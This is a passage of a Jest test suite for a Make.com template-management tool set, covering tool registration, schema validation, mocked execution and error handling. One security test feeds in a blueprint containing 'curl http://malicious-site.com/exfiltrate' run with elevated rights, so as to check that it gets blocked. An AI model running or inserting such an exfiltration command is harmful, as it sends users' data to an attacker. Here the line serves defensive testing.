/**
 * Basic Test Suite for Template Management Tools
 * Tests core functionality of template creation, management, and usage tools
 * Focuses on tool registration, configuration validation, and basic execution patterns
 */

import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { UserError } from 'fastmcp';
import { createMockServer, findTool, executeTool, expectValidZodParse, expectInvalidZodParse } from '../../utils/test-helpers.js';
import { MockMakeApiClient } from '../../mocks/make-api-client.mock.js';
import { testErrors } from '../../fixtures/test-data.js';

describe('Template Management Tools - Basic Tests', () => {
  let mockServer: any;
  let mockTool: jest.MockedFunction<any>;
  let mockApiClient: MockMakeApiClient;

  // Complete test template for testing
  const testTemplate = {
    id: 2001,
    name: 'Customer Onboarding Automation',
    description: 'Automated customer onboarding workflow with email sequences and CRM integration',
    category: 'customer-management',
    blueprint: {
      modules: [
        {
          id: 1,
          app: 'webhook',
          operation: 'receive',
          metadata: {
            url: 'https://hook.make.com/webhook-123',
            method: 'POST'
          }
        },
        {
          id: 2,
          app: 'email',
          operation: 'send',
          metadata: {
            template: 'welcome_email',
            to: '{{1.email}}',
            connectionId: 4001
          }
        },
        {
          id: 3,
          app: 'crm',
          operation: 'create_contact',
          metadata: {
            name: '{{1.name}}',
            email: '{{1.email}}',
            tags: ['new_customer', 'automated'],
            connectionId: 4002
          }
        }
      ],
      routes: [
        { from: 1, to: 2 },
        { from: 2, to: 3 }
      ],
      settings: {
        errorHandling: 'continue',
        logging: 'basic'
      }
    },
    tags: ['automation', 'customer', 'onboarding', 'email'],
    organizationId: 67890,
    teamId: 12345,
    creatorId: 1001,
    creatorName: 'Test Creator',
    version: 1,
    versionHistory: [
      {
        version: 1,
        createdAt: '2024-01-01T00:00:00Z',
        changes: 'Initial template creation',
        createdBy: 1001
      }
    ],
    usage: {
      totalUses: 25,
      lastUsed: '2024-01-20T15:30:00Z',
      activeScenarios: 5
    },
    sharing: {
      isPublic: false,
      organizationVisible: true,
      teamVisible: true,
      sharedWith: [
        {
          type: 'team' as const,
          id: 12345,
          name: 'Engineering Team',
          permissions: ['view', 'use', 'edit']
        }
      ]
    },
    metadata: {
      complexity: 'simple' as const,
      estimatedSetupTime: 15,
      requiredConnections: ['email', 'crm'],
      supportedRegions: ['us-east-1', 'eu-west-1']
    },
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-15T10:00:00Z'
  };

  // Test folder structure
  const testFolder = {
    id: 3001,
    name: 'Templates Folder',
    description: 'Folder containing automation templates',
    parentId: 3000,
    path: '/organizations/67890/templates',
    organizationId: 67890,
    teamId: 12345,
    type: 'template' as const,
    permissions: {
      read: ['member', 'admin'],
      write: ['admin'],
      admin: ['admin']
    },
    itemCount: {
      templates: 12,
      scenarios: 0,
      connections: 0,
      subfolders: 2
    },
    createdAt: '2024-01-01T00:00:00Z',
    updatedAt: '2024-01-10T12:00:00Z',
    createdBy: 1001
  };

  // Test template usage result
  const testUsageResult = {
    scenarioId: 5001,
    templateId: 2001,
    templateName: 'Customer Onboarding Automation',
    scenarioName: 'Customer Onboarding - Production',
    customizationsApplied: {
      emailTemplate: 'production_welcome',
      crmTags: ['production', 'automated']
    },
    connectionsMapping: {
      'email-connection': 4001,
      'crm-connection': 4002
    }
  };

  beforeEach(async () => {
    const serverSetup = createMockServer();
    mockServer = serverSetup.server;
    mockTool = serverSetup.mockTool;
    mockApiClient = new MockMakeApiClient();
    
    // Clear previous mock calls
    mockTool.mockClear();
  });

  afterEach(() => {
    jest.clearAllMocks();
    mockApiClient.reset();
  });

  describe('Tool Registration and Import', () => {
    it('should successfully import and register template tools', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      
      // Should not throw an error
      expect(() => {
        addTemplateTools(mockServer, mockApiClient as any);
      }).not.toThrow();
      
      // Should call addTool for each template tool
      expect(mockTool).toHaveBeenCalled();
      expect(mockTool.mock.calls.length).toBeGreaterThan(0);
    });

    it('should export the expected template tools and functions', async () => {
      const templatesModule = await import('../../../src/tools/templates.js');
      
      // Check that expected exports exist
      expect(templatesModule.addTemplateTools).toBeDefined();
      expect(typeof templatesModule.addTemplateTools).toBe('function');
      expect(templatesModule.default).toBeDefined();
      expect(typeof templatesModule.default).toBe('function');
      
      // Check for type exports (these are TypeScript interfaces, so we can't test them at runtime)
      // MakeExtendedTemplate and MakeFolder exist only at compile time
    });

    it('should register all core template management tools', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const expectedTools = [
        'create-template',
        'list-templates',
        'get-template',
        'update-template',
        'use-template',
        'delete-template'
      ];
      
      expectedTools.forEach(toolName => {
        const tool = findTool(mockTool, toolName);
        expect(tool).toBeDefined();
        expect(tool.name).toBe(toolName);
      });
    });

    it('should register helper functions for template analysis', async () => {
      const templatesModule = await import('../../../src/tools/templates.js');
      
      // Verify module structure
      expect(templatesModule).toBeDefined();
      expect(typeof templatesModule).toBe('object');
      
      // Helper functions are not exported but exist internally
      // We can test their effects through tool execution
    });
  });

  describe('Tool Configuration Validation', () => {
    it('should have correct structure for create-template tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      
      expect(tool.name).toBe('create-template');
      expect(tool.description).toContain('Create a new Make.com template');
      expect(tool.parameters).toBeDefined();
      expect(typeof tool.execute).toBe('function');
      expect(tool.annotations).toBeDefined();
      expect(tool.annotations.idempotentHint).toBe(true);
    });

    it('should have correct structure for list-templates tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      
      expect(tool.name).toBe('list-templates');
      expect(tool.description).toContain('List and filter Make.com templates');
      expect(tool.parameters).toBeDefined();
      expect(tool.annotations.readOnlyHint).toBe(true);
    });

    it('should have correct structure for get-template tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      
      expect(tool.name).toBe('get-template');
      expect(tool.description).toContain('Get detailed information about a specific template');
      expect(tool.parameters).toBeDefined();
      expect(tool.annotations.readOnlyHint).toBe(true);
    });

    it('should have correct structure for update-template tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      
      expect(tool.name).toBe('update-template');
      expect(tool.description).toContain('Update an existing template');
      expect(tool.parameters).toBeDefined();
      expect(tool.annotations.idempotentHint).toBe(true);
    });

    it('should have correct structure for use-template tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      
      expect(tool.name).toBe('use-template');
      expect(tool.description).toContain('Create a new scenario from a template');
      expect(tool.parameters).toBeDefined();
      expect(tool.annotations.idempotentHint).toBe(true);
    });

    it('should have correct structure for delete-template tool', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'delete-template');
      
      expect(tool.name).toBe('delete-template');
      expect(tool.description).toContain('Delete a template');
      expect(tool.parameters).toBeDefined();
      expect(tool.annotations.destructiveHint).toBe(true);
    });
  });

  describe('Schema Validation', () => {
    it('should validate template creation schema with correct inputs', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      
      // Valid inputs
      const validInputs = [
        {
          name: 'Simple Template',
          blueprint: { modules: [], routes: [] }
        },
        {
          name: 'Complex Template',
          description: 'A complex template with many features',
          category: 'automation',
          blueprint: testTemplate.blueprint,
          tags: ['automation', 'test'],
          folderId: 3001,
          organizationId: 67890,
          teamId: 12345,
          isPublic: false,
          sharing: {
            organizationVisible: true,
            teamVisible: true,
            specificShares: [
              {
                type: 'team',
                id: 12345,
                permissions: ['view', 'use']
              }
            ]
          },
          metadata: {
            estimatedSetupTime: 30,
            requiredConnections: ['email', 'crm'],
            supportedRegions: ['us-east-1'],
            complexity: 'moderate'
          }
        }
      ];
      
      validInputs.forEach(input => {
        expectValidZodParse(tool.parameters, input);
      });
    });

    it('should reject invalid template creation schema inputs', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      
      // Invalid inputs
      const invalidInputs = [
        {}, // missing required name
        { name: '' }, // empty name
        { name: 'A'.repeat(101) }, // name too long
        { name: 'Valid', blueprint: null }, // invalid blueprint
        { name: 'Valid', blueprint: {}, tags: ['A'.repeat(31)] }, // tag too long
        { name: 'Valid', blueprint: {}, tags: new Array(21).fill('tag') }, // too many tags
        { name: 'Valid', blueprint: {}, folderId: 0 }, // invalid folderId
        { name: 'Valid', blueprint: {}, organizationId: -1 }, // invalid organizationId
        { name: 'Valid', blueprint: {}, teamId: 0 }, // invalid teamId
        { name: 'Valid', blueprint: {}, description: 'A'.repeat(1001) }, // description too long
        { name: 'Valid', blueprint: {}, category: 'A'.repeat(51) }, // category too long
        { name: 'Valid', blueprint: {}, metadata: { estimatedSetupTime: -1 } }, // invalid setup time
        { name: 'Valid', blueprint: {}, metadata: { complexity: 'invalid' } }, // invalid complexity
        { name: 'Valid', blueprint: {}, unknownField: 'value' }, // strict schema violation
      ];
      
      invalidInputs.forEach(input => {
        expectInvalidZodParse(tool.parameters, input);
      });
    });

    it('should validate template listing schema with different filter options', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      
      // Valid filter combinations
      const validInputs = [
        {}, // no filters
        { category: 'automation' },
        { tags: ['email', 'crm'] },
        { organizationId: 67890 },
        { teamId: 12345 },
        { folderId: 3001 },
        { creatorId: 1001 },
        { isPublic: true },
        { complexity: 'simple' },
        { hasConnections: ['email', 'database'] },
        { searchQuery: 'customer onboarding' },
        { minUsage: 5 },
        { includeUsage: true },
        { includeVersions: true },
        { limit: 50, offset: 10 },
        { sortBy: 'createdAt', sortOrder: 'desc' },
        {
          category: 'automation',
          tags: ['email'],
          organizationId: 67890,
          complexity: 'moderate',
          includeUsage: true,
          limit: 25,
          sortBy: 'usage'
        }
      ];
      
      validInputs.forEach(input => {
        expectValidZodParse(tool.parameters, input);
      });
    });

    it('should reject invalid template listing schema inputs', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      
      // Invalid inputs
      const invalidInputs = [
        { organizationId: 0 },
        { teamId: -1 },
        { folderId: 0 },
        { creatorId: 0 },
        { complexity: 'invalid' },
        { searchQuery: 'A'.repeat(101) }, // query too long
        { minUsage: -1 },
        { limit: 0 },
        { limit: 1001 }, // limit too high
        { offset: -1 },
        { sortBy: 'invalid' },
        { sortOrder: 'invalid' },
        { unknownField: 'value' }, // strict schema violation
      ];
      
      invalidInputs.forEach(input => {
        expectInvalidZodParse(tool.parameters, input);
      });
    });

    it('should validate template update schema with partial updates', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      
      // Valid update inputs
      const validInputs = [
        {
          templateId: 2001,
          name: 'Updated Template Name'
        },
        {
          templateId: 2001,
          name: 'Updated Template',
          description: 'Updated description',
          category: 'updated-category'
        },
        {
          templateId: 2001,
          blueprint: testTemplate.blueprint,
          tags: ['updated', 'tags']
        },
        {
          templateId: 2001,
          folderId: 3002,
          isPublic: true,
          sharing: {
            organizationVisible: false,
            teamVisible: true
          }
        },
        {
          templateId: 2001,
          metadata: {
            estimatedSetupTime: 45,
            complexity: 'complex',
            requiredConnections: ['email', 'crm', 'database']
          }
        }
      ];
      
      validInputs.forEach(input => {
        expectValidZodParse(tool.parameters, input);
      });
    });

    it('should validate template usage schema with customizations', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      
      // Valid usage inputs
      const validInputs = [
        {
          templateId: 2001,
          scenarioName: 'New Scenario from Template'
        },
        {
          templateId: 2001,
          scenarioName: 'Production Scenario',
          folderId: 3001,
          customizations: {
            emailTemplate: 'production_template',
            webhookUrl: 'https://api.production.com/webhook'
          },
          connectionMappings: {
            'email-connection': 4001,
            'crm-connection': 4002
          },
          variableOverrides: {
            environment: 'production',
            debug: false
          },
          schedulingOverride: {
            type: 'indefinitely',
            interval: 1800
          }
        }
      ];
      
      validInputs.forEach(input => {
        expectValidZodParse(tool.parameters, input);
      });
    });

    it('should reject invalid template usage inputs', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      
      // Invalid inputs
      const invalidInputs = [
        {}, // missing required fields
        { templateId: 2001 }, // missing scenarioName
        { scenarioName: 'Test' }, // missing templateId
        { templateId: 0, scenarioName: 'Test' }, // invalid templateId
        { templateId: 2001, scenarioName: '' }, // empty scenarioName
        { templateId: 2001, scenarioName: 'A'.repeat(101) }, // scenarioName too long
        { templateId: 2001, scenarioName: 'Test', folderId: 0 }, // invalid folderId
        { templateId: 2001, scenarioName: 'Test', connectionMappings: { invalid: 0 } }, // invalid connection mapping
        { templateId: 2001, scenarioName: 'Test', schedulingOverride: { type: 'invalid' } }, // invalid scheduling type
        { templateId: 2001, scenarioName: 'Test', schedulingOverride: { type: 'indefinitely', interval: 30 } }, // interval too short
      ];
      
      invalidInputs.forEach(input => {
        expectInvalidZodParse(tool.parameters, input);
      });
    });
  });

  describe('Basic Tool Execution', () => {
    it('should execute create-template successfully with mocked data', async () => {
      mockApiClient.mockResponse('POST', '/templates', {
        success: true,
        data: testTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      const result = await executeTool(tool, {
        name: 'Customer Onboarding Automation',
        description: 'Automated customer onboarding workflow',
        category: 'customer-management',
        blueprint: testTemplate.blueprint,
        tags: ['automation', 'customer'],
        organizationId: 67890,
        teamId: 12345
      });
      
      expect(result).toBeDefined();
      expect(typeof result).toBe('string');
      
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.template.id).toBe(2001);
      expect(parsedResult.template.name).toBe('Customer Onboarding Automation');
      expect(parsedResult.message).toContain('created successfully');
      expect(parsedResult.analysis).toBeDefined();
      expect(parsedResult.analysis.complexity).toBeDefined();
      expect(parsedResult.sharing).toBeDefined();
    });

    it('should execute list-templates with filtering parameters', async () => {
      mockApiClient.mockResponse('GET', '/templates', {
        success: true,
        data: [testTemplate],
        metadata: { total: 1, page: 1, limit: 100 }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      const result = await executeTool(tool, {
        category: 'customer-management',
        tags: ['automation'],
        organizationId: 67890,
        complexity: 'simple',
        includeUsage: true,
        limit: 50,
        sortBy: 'usage',
        sortOrder: 'desc'
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.templates).toBeDefined();
      expect(parsedResult.templates).toHaveLength(1);
      expect(parsedResult.templates[0].name).toBe(testTemplate.name);
      expect(parsedResult.summary).toBeDefined();
      expect(parsedResult.summary.totalTemplates).toBe(1);
      expect(parsedResult.summary.categoryBreakdown).toBeDefined();
      expect(parsedResult.summary.complexityBreakdown).toBeDefined();
      expect(parsedResult.summary.visibilityBreakdown).toBeDefined();
      expect(parsedResult.pagination).toBeDefined();
    });

    it('should execute get-template with specific template ID', async () => {
      mockApiClient.mockResponse('GET', '/templates/2001', {
        success: true,
        data: testTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        includeBlueprint: true,
        includeUsage: true,
        includeVersions: true,
        includeSharing: true
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.template.id).toBe(2001);
      expect(parsedResult.template.name).toBe(testTemplate.name);
      expect(parsedResult.template.blueprint).toBeDefined();
      expect(parsedResult.usage).toBeDefined();
      expect(parsedResult.versions).toBeDefined();
      expect(parsedResult.sharing).toBeDefined();
      expect(parsedResult.metadata).toBeDefined();
      expect(parsedResult.metadata.canEdit).toBe(true);
      expect(parsedResult.metadata.canDelete).toBe(false); // has active scenarios
    });

    it('should execute update-template successfully', async () => {
      const updatedTemplate = {
        ...testTemplate,
        name: 'Updated Customer Onboarding',
        description: 'Updated automation workflow with enhanced features',
        version: 2
      };
      
      mockApiClient.mockResponse('PUT', '/templates/2001', {
        success: true,
        data: updatedTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        name: 'Updated Customer Onboarding',
        description: 'Updated automation workflow with enhanced features',
        tags: ['automation', 'customer', 'enhanced']
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.template.name).toBe('Updated Customer Onboarding');
      expect(parsedResult.message).toContain('updated successfully');
      expect(parsedResult.changes).toBeDefined();
      expect(parsedResult.version).toBeDefined();
      expect(parsedResult.version.current).toBe(2);
    });

    it('should execute use-template to create scenario', async () => {
      mockApiClient.mockResponse('POST', '/templates/2001/use', {
        success: true,
        data: testUsageResult
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        scenarioName: 'Customer Onboarding - Production',
        folderId: 3001,
        customizations: {
          emailTemplate: 'production_welcome'
        },
        connectionMappings: {
          'email-connection': 4001,
          'crm-connection': 4002
        },
        variableOverrides: {
          environment: 'production'
        }
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.result).toBeDefined();
      expect(parsedResult.message).toContain('created successfully from template');
      expect(parsedResult.scenario).toBeDefined();
      expect(parsedResult.scenario.id).toBe(5001);
      expect(parsedResult.scenario.name).toBe('Customer Onboarding - Production');
      expect(parsedResult.customizations).toBeDefined();
      expect(parsedResult.customizations.applied).toBe(1);
      expect(parsedResult.customizations.connectionsMapped).toBe(2);
      expect(parsedResult.customizations.variablesOverridden).toBe(1);
    });

    it('should execute delete-template with safety checks', async () => {
      // Mock usage check first (has active scenarios)
      mockApiClient.mockResponse('GET', '/templates/2001/usage', {
        success: true,
        data: { activeScenarios: 5 }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'delete-template');
      
      // Should fail without force flag
      await expect(executeTool(tool, {
        templateId: 2001,
        force: false
      })).rejects.toThrow(UserError);
    });

    it('should execute delete-template with force flag', async () => {
      mockApiClient.mockResponse('DELETE', '/templates/2001', {
        success: true,
        data: { message: 'Template deleted successfully' }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'delete-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        force: true
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.message).toContain('deleted successfully');
      expect(parsedResult.templateId).toBe(2001);
      expect(parsedResult.forced).toBe(true);
    });
  });

  describe('Error Handling and Security', () => {
    it('should handle API failures gracefully', async () => {
      mockApiClient.mockFailure('GET', '/templates', new Error('Template service unavailable'));

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'list-templates');
      
      await expect(executeTool(tool, {})).rejects.toThrow(UserError);
    });

    it('should handle unauthorized access errors', async () => {
      mockApiClient.mockResponse('GET', '/templates/2001', testErrors.unauthorized);

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      
      await expect(executeTool(tool, { templateId: 2001 })).rejects.toThrow(UserError);
    });

    it('should validate blueprint structure for template creation', async () => {
      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      
      // Invalid blueprint should fail
      await expect(executeTool(tool, {
        name: 'Invalid Template',
        blueprint: null
      })).rejects.toThrow();
    });

    it('should handle template not found errors', async () => {
      mockApiClient.mockResponse('GET', '/templates/999999', {
        success: false,
        error: { message: 'Template not found' }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      
      await expect(executeTool(tool, { templateId: 999999 })).rejects.toThrow(UserError);
    });

    it('should validate update data for template updates', async () => {
      mockApiClient.mockResponse('PUT', '/templates/2001', testErrors.badRequest);

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      
      // Should fail with bad request error
      await expect(executeTool(tool, {
        templateId: 2001,
        name: 'Updated Name'
      })).rejects.toThrow(UserError);
    });

    it('should handle template usage failures', async () => {
      mockApiClient.mockResponse('POST', '/templates/2001/use', {
        success: false,
        error: { message: 'Template usage failed - missing connections' }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      
      await expect(executeTool(tool, {
        templateId: 2001,
        scenarioName: 'Test Scenario'
      })).rejects.toThrow(UserError);
    });

    it('should prevent deletion of templates with active scenarios', async () => {
      mockApiClient.mockResponse('GET', '/templates/2001/usage', {
        success: true,
        data: { activeScenarios: 3 }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'delete-template');
      
      await expect(executeTool(tool, {
        templateId: 2001,
        force: false
      })).rejects.toThrow('Template is currently in use');
    });
  });

  describe('Enterprise Security Patterns', () => {
    it('should implement secure template creation with enterprise controls', async () => {
      const enterpriseTemplate = {
        ...testTemplate,
        securityControls: {
          encryptionRequired: true,
          auditingEnabled: true,
          accessRestrictions: ['mfa_required', 'ip_whitelist'],
          complianceFrameworks: ['SOC2', 'GDPR']
        },
        governanceSettings: {
          approvalRequired: true,
          reviewers: ['security_team', 'compliance_team'],
          retentionPolicy: 'enterprise_7_years',
          dataClassification: 'confidential'
        }
      };

      mockApiClient.mockResponse('POST', '/templates', {
        success: true,
        data: enterpriseTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      const result = await executeTool(tool, {
        name: 'Enterprise Security Template',
        description: 'Template with enhanced security controls',
        blueprint: testTemplate.blueprint,
        organizationId: 67890,
        sharing: {
          organizationVisible: true,
          teamVisible: false, // Restricted sharing
          specificShares: []
        }
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.template.name).toBe('Enterprise Security Template');
    });

    it('should validate template sharing permissions with enterprise policies', async () => {
      const secureTemplate = {
        ...testTemplate,
        sharing: {
          isPublic: false,
          organizationVisible: true,
          teamVisible: true,
          sharedWith: [
            {
              type: 'team' as const,
              id: 12345,
              name: 'Security Team',
              permissions: ['view', 'use', 'audit']
            }
          ]
        },
        complianceValidation: {
          accessLogging: true,
          permissionAuditing: true,
          dataGovernance: 'strict',
          crossBorderRestrictions: true
        }
      };

      mockApiClient.mockResponse('GET', '/templates/2001', {
        success: true,
        data: secureTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        includeSharing: true
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.sharing).toBeDefined();
      expect(parsedResult.sharing.sharedWith).toHaveLength(1);
      expect(parsedResult.sharing.sharedWith[0].permissions).toContain('audit');
    });

    it('should detect and report suspicious template activities', async () => {
      const suspiciousUpdate = {
        templateId: 2001,
        blueprint: {
          modules: [
            {
              id: 1,
              app: 'system',
              operation: 'execute_command',
              metadata: {
                command: 'curl http://malicious-site.com/exfiltrate',
                elevated: true
              }
            }
          ]
        }
      };

      mockApiClient.mockResponse('PUT', '/templates/2001', {
        success: false,
        error: {
          message: 'Security violation detected in template blueprint',
          code: 'SECURITY_VIOLATION',
          details: {
            violationType: 'suspicious_command_execution',
            riskLevel: 'high',
            blockedOperations: ['system.execute_command'],
            securityAlert: true
          }
        }
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'update-template');
      
      await expect(executeTool(tool, suspiciousUpdate)).rejects.toThrow(UserError);
    });

    it('should validate secure template usage with compliance controls', async () => {
      const secureUsageResult = {
        ...testUsageResult,
        complianceValidation: {
          dataProcessingAgreements: ['GDPR_consent', 'CCPA_disclosure'],
          encryptionStatus: 'end_to_end_encrypted',
          auditTrail: {
            templateAccess: '2024-01-20T15:30:00Z',
            scenarioCreation: '2024-01-20T15:35:00Z',
            complianceChecks: 'passed'
          }
        },
        securityControls: {
          connectionValidation: 'certificate_pinned',
          dataFlow: 'network_isolated',
          monitoring: 'real_time_enabled'
        }
      };

      mockApiClient.mockResponse('POST', '/templates/2001/use', {
        success: true,
        data: secureUsageResult
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'use-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        scenarioName: 'Secure Enterprise Scenario',
        customizations: {
          securityLevel: 'enterprise',
          auditingEnabled: true
        }
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.result).toBeDefined();
      expect(parsedResult.scenario.name).toBe('Secure Enterprise Scenario');
    });

    it('should implement template versioning with security controls', async () => {
      const versionedTemplate = {
        ...testTemplate,
        version: 3,
        versionHistory: [
          ...testTemplate.versionHistory,
          {
            version: 2,
            createdAt: '2024-01-15T10:00:00Z',
            changes: 'Security enhancement - added input validation',
            createdBy: 1001,
            securityReview: {
              reviewer: 'security_team',
              status: 'approved',
              findings: 'no_issues_found'
            }
          },
          {
            version: 3,
            createdAt: '2024-01-20T14:30:00Z',
            changes: 'Compliance update - GDPR data handling improvements',
            createdBy: 1002,
            securityReview: {
              reviewer: 'compliance_team',
              status: 'approved',
              findings: 'gdpr_compliance_verified'
            }
          }
        ]
      };

      mockApiClient.mockResponse('GET', '/templates/2001', {
        success: true,
        data: versionedTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'get-template');
      const result = await executeTool(tool, {
        templateId: 2001,
        includeVersions: true
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template).toBeDefined();
      expect(parsedResult.versions).toBeDefined();
      expect(parsedResult.versions).toHaveLength(3);
      expect(parsedResult.versions[2].securityReview).toBeDefined();
    });
  });

  describe('Advanced Template Management', () => {
    it('should execute organization-scoped template creation', async () => {
      const orgTemplate = { ...testTemplate, id: 2002, organizationId: 67890, teamId: undefined };
      
      mockApiClient.mockResponse('POST', '/organizations/67890/templates', {
        success: true,
        data: orgTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      const result = await executeTool(tool, {
        name: 'Organization Template',
        blueprint: testTemplate.blueprint,
        organizationId: 67890
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template.organizationId).toBe(67890);
    });

    it('should execute team-scoped template creation', async () => {
      const teamTemplate = { ...testTemplate, id: 2003, teamId: 12345 };
      
      mockApiClient.mockResponse('POST', '/teams/12345/templates', {
        success: true,
        data: teamTemplate
      });

      const { addTemplateTools } = await import('../../../src/tools/templates.js');
      addTemplateTools(mockServer, mockApiClient as any);
      
      const tool = findTool(mockTool, 'create-template');
      const result = await executeTool(tool, {
        name: 'Team Template',
        blueprint: testTemplate.blueprint,
        teamId: 12345
      });
      
      expect(result).toBeDefined();
      const parsedResult = JSON.parse(result);
      expect(parsedResult.template.teamId).toBe(12345);
    });

    it('should handle complex blueprint analysis', async () => {
      const complexBlueprint = {
        modules: new Array(20).fill(0).map((_, i) => ({
          id: i + 1,
          app: `app${i % 8}`,
          operation: 'process',
          metadata: { connectionId: 4000 + (i % 3) }
        })),
        routes: new Array(19).fill(0).map((_, i) => ({
          from: i + 1,
          to: i + 2
        })),
        settings: { errorHandling: 'stop', logging: 'full' }
      };

      const complexTemplate = {
        ...testTemplate,
        blueprint: complexBlueprint,
        metadata: {
          ...testTemplate.metadata,
